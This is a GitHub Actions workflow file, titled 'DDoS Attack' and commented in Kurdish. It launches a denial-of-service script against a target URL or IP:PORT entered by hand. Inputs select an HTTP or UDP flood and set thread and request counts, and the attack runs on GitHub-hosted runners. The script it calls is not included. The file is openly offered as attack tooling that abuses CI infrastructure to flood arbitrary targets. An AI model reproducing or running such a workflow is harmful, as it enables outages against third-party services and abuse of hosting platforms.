name: DDoS Attack

on:
  workflow_dispatch:    # بە دەستی کار پێ بکەیت
    inputs:
      target_url:
        description: 'URLی ئامانج یان IP:PORT'
        required: true
      attack_type:
        description: 'جۆری هێرش (website/udp)'
        required: true
        default: 'website'
        type: choice
        options:
          - website
          - udp
      threads:
        description: 'ژمارەی تڕێدەکان (بۆ website)'
        required: false
        default: '100'
      requests:
        description: 'ژمارەی داواکارییەکان'
        required: false
        default: '10000'

jobs:
  attack:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@v3
      
      - name: Setup Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.10'
          
      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install aiohttp faker
          
      - name: Run Attack
        run: |
          python my_code.py
        env:
          TARGET_URL: ${{ github.event.inputs.target_url }}
          ATTACK_TYPE: ${{ github.event.inputs.attack_type }}
          THREADS: ${{ github.event.inputs.threads }}
          REQUESTS: ${{ github.event.inputs.requests }}
